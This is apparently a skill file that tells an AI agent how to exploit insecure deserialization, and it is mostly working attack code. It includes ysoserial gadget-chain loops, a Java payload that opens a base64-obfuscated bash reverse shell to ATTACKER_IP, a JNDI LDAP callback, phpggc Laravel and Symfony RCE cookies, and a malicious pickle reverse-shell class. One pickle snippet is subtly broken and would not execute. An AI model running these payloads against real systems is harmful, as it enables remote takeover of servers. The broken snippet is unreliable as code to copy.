---
name: vuln-deserialization
description: "Insecure deserialization testing — Java (ysoserial gadget chains), PHP object injection, Python pickle RCE, Ruby Marshal injection, .NET BinaryFormatter, Jackson/XStream, node-serialize. Triggers: 'deserialization', 'insecure deserialization', 'java deserialization', 'php deserialization', 'ysoserial', 'pickle rce', 'object injection', 'gadget chain', 'serialized object', 'java serialization'."
---

# Insecure Deserialization Testing

Exploit unsafe deserialization of user-controlled data to achieve RCE via gadget chains.

---

## Phase 1: Detection

```bash
TARGET="https://TARGET"

# Detect Java serialized objects (magic bytes rO0):
curl -s -I "$TARGET/api" | grep -i "set-cookie"
# Look for: JSESSIONID, viewstate, session cookies that look base64

# Check for Java serial magic bytes in requests:
# rO0 = base64 of AC ED 00 05 (Java serialized object header)
echo -n "rO0" | base64 -d | xxd | head -1

# PHP serialized objects:
# O:8:"UserData":1:{s:4:"name";s:5:"admin";}
# Look in cookies, hidden fields, POST bodies

# Python pickle (detect protocol bytes):
curl -s -X POST "$TARGET/api/session" \
  -H "Content-Type: application/octet-stream" \
  --data-binary $'\x80\x05\x95' -I

# Check response headers for framework hints:
curl -s -I "$TARGET/" | grep -iE "x-powered-by|server|x-aspnet"
```

---

## Phase 2: Java Deserialization

```bash
TARGET="https://TARGET"
YSOSERIAL="java -jar /opt/ysoserial.jar"
LHOST="ATTACKER_IP"
LPORT="4444"

# Test common gadget chains:
CHAINS=("CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections6" "Spring1" "Spring2" "Groovy1" "Hibernate1" "ROME")

for CHAIN in "${CHAINS[@]}"; do
  $YSOSERIAL $CHAIN "curl http://$LHOST:8080/chain-$CHAIN" 2>/dev/null | \
    curl -s -X POST "$TARGET/api/deserialize" \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @- -o /dev/null -w "$CHAIN: %{http_code}\n"
done | tee output/deser_java_results.txt

# Exploitation with RCE:
$YSOSERIAL CommonsCollections6 "bash -c {echo,$(echo -n "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64)}|{base64,-d}|{bash,-i}" 2>/dev/null | \
  curl -s -X POST "$TARGET/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @-

# Detect via JNDI (Log4Shell-style):
$YSOSERIAL JNDI "ldap://$LHOST:1389/exploit" 2>/dev/null | \
  curl -s -X POST "$TARGET/api/deserialize" \
  --data-binary @-
```

---

## Phase 3: PHP Object Injection

```bash
TARGET="https://TARGET"

# Probe for PHP deserialization in cookies/POST:
# Craft a simple probe payload:
python3 -c "
import base64
payload = 'O:8:\"stdClass\":1:{s:4:\"test\";s:2:\"ok\";}'
print(base64.b64encode(payload.encode()).decode())
"

# Test with phpggc (https://github.com/ambionics/phpggc):
# List available chains:
./phpggc -l | grep -i "exec\|rce\|system"

# Generate Laravel RCE payload:
./phpggc Laravel/RCE1 system "id" | base64

# Generate Symfony RCE:
./phpggc Symfony/RCE4 system "id" | base64

# Send via cookie or POST:
PAYLOAD=$(./phpggc Laravel/RCE1 system "id" | base64)
curl -s "$TARGET/" -H "Cookie: laravel_session=$PAYLOAD"
curl -s -X POST "$TARGET/api/data" -d "data=$PAYLOAD"
```

---

## Phase 4: Python Pickle RCE

```bash
TARGET="https://TARGET"
LHOST="ATTACKER_IP"
LPORT="4444"

# Generate malicious pickle:
python3 << 'EOF'
import pickle, os, base64

class RCE(object):
    def __reduce__(self):
        cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
EOF

# Or use a simple command injection:
python3 -c "
import pickle, os, base64
payload = pickle.dumps({'__reduce__': (os.system, ('id > /tmp/pwned',))})
print(base64.b64encode(payload).decode())
"

# Send to endpoint:
PAYLOAD=$(python3 -c "import pickle, os, base64; print(base64.b64encode(pickle.dumps({'__reduce__': (os.system, ('id',))})).decode())")
curl -s -X POST "$TARGET/api/session" -d "session=$PAYLOAD"
```

---

## Output

Save to `output/`:
- `deser_java_results.txt` — gadget chain probe results
- `deser_rce_poc.txt` — exact payload that achieved RCE

## Next Phase

→ `vuln-rce` for post-exploitation steps
→ `pentest-report` to document findings
